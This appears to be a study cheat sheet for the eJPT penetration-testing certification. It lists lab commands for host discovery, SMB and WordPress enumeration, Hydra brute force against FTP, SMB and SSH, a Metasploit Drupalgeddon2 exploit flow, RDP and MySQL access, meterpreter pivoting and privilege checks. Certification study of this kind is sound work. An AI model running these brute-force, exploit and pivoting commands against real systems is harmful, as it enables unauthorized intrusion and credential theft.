Cheat Sheet

This cheat sheet is a list of commands to help with the eJPT.

*** FOR A DEEP DIVE REFER TO: ***

----------------------------------------------------------------------------------------------------------------------

📡 Phase 1: Deep Discovery & Network Mapping
Host Discovery
Identify live hosts using ARP discovery
netdiscover -r 10.11.12.0/24

Find live hosts using fping and save to a file
fping -a -g 10.11.12.0/24 2>/dev/null | tee scans.txt

Nmap Mastery
Comprehensive scan for all ports, OS, and service versions
nmap -sV -sC -O -A -p- -T4 10.11.12.13

Identify specific Windows server instances in scan results
grep -i "windows server xxxx" full_scan.txt

Infrastructure
Add virtual hosts to access web services by name
sudo nano /etc/hosts

<Add the IP and Name, e.g., 10.11.12.13 wordpress.local>
🪟 Phase 2: SMB & RPC Enumeration
Share Enumeration
List all available shares anonymously (Null Session)
smbclient -L //10.11.12.13 -N

Map shares and list permissions for a specific user
smbmap -H 10.11.12.13 -u user -p ""

Deep Dive Enumeration
Comprehensive Windows/Samba enumeration (Users, Shares, OS details)
enum4linux -a 10.11.12.13

Connect to a specific SMB share as a valid user
smbclient //10.11.12.13/Users -U user

🌐 Phase 3: Web Application & CMS Exploitation
WordPress & Drupal
Inspect headers for locations and redirects
curl -I http://10.11.12.13/wp-login.php

Enumerate WordPress users and vulnerable plugins
wpscan --url http://wordpress.local --enumerate u,vp

Brute force WordPress login via XML-RPC
wpscan --url http://wordpress.local/ -U user -P /usr/share/wordlists/rockyou.txt

Identify Drupal version from the CHANGELOG
curl http://10.11.12.13/drupal/CHANGELOG.txt

Metasploit Framework
Bash
# Basic Flow
msfconsole
search <vulnerability_name>
use <exploit_number>
show options
set RHOSTS 10.11.12.13
set LHOST tun0  # Your VPN IP
run
Example: Drupalgeddon2 RCE
use exploit/unix/webapp/drupal_drupalgeddon2
set TARGETURI /drupal/

🔑 Phase 4: Password Cracking (Hydra)
Brute force FTP
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ftp

Brute force SMB
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 smb

Brute force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.13 ssh

🖥️ Phase 5: Remote Access & SQL
RDP (Remote Desktop)
Standard RDP connection
xfreerdp /u:admin /p:xyz /v:10.11.12.13 /cert-ignore

Enhanced RDP (Dynamic resolution & clipboard)
xfreerdp /v:10.11.12.13 /u:admin /p:xyz /dynamic-resolution +clipboard /cert-ignore

SQL Databases
Login to MySQL with specific port
mysql --user=root --port=13306 -p -h 10.11.12.13

Common SQL Commands
SHOW databases;
use <db_name>;
SHOW tables;
SELECT * FROM <table_name>;

🚀 Phase 6: Pivoting & Internal Enumeration
Routing & Ports
View routing tables (Linux/Windows)
ip route / route print

View active connections and listening ports
netstat -tulpn (Linux) / netstat -ano (Windows)

Add a manual network route (Linux)
sudo ip route add 10.10.10.0/24 via 10.11.12.13

Metasploit Pivoting
Add an internal route through a compromised session
meterpreter > route add 172.16.1.0 255.255.255.0 1

🏆 Phase 7: Post-Exploitation & PrivEsc
Privilege Checks
List Windows user privileges (Check for SeImpersonate)
whoami /priv

List members of the local Administrators group
net localgroup administrators

Identify Linux hashing algorithm (SHA-512)
grep "ENCRYPT_METHOD" /etc/login.defs

Flag Hunting
Search for flags in Windows user directories
dir C:\Users\abc\Documents\flag.txt
